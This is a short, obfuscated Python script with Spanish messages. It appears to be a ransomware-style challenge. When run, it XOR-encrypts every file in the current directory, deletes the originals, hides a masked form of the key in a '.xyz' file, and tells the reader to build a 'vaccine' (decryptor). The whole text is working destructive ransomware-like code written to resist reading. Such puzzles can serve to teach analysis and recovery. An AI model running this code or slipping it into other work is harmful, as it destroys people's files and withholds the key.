# -*- coding: utf-8 -*-
from sys import argv,version_info
import os
assert version_info[0] == 3, 'USA PYTHON 3'
def xx(x):
 with open(x+'.enc','wb') as z:
  z.write((lambda x:bytes([x[i]^k[i%16] for i in range(len(x))]))(open(x,'rb').read()))
 os.remove(x)
_,_,x = next(os.walk('./'));x.remove(argv[0]);y='\x2e'
r=os.urandom;k=r(16);list(map(xx,x))
d,k=map(lambda x:int.from_bytes(k,'big'),[0xba,0xbe])
d|=1;y+='\x78';c=r(1)[0]|(1<<7);k=d*k%(1<<c)
d,k=map(lambda x:x.to_bytes(32,'big'),[d,k])
c=bytes([c]);y+='\x79\x7a'
with open(y,'wb') as z:
 z.write(c+d+k)
print('Archivos encriptados\nAhora crea una vacuna')
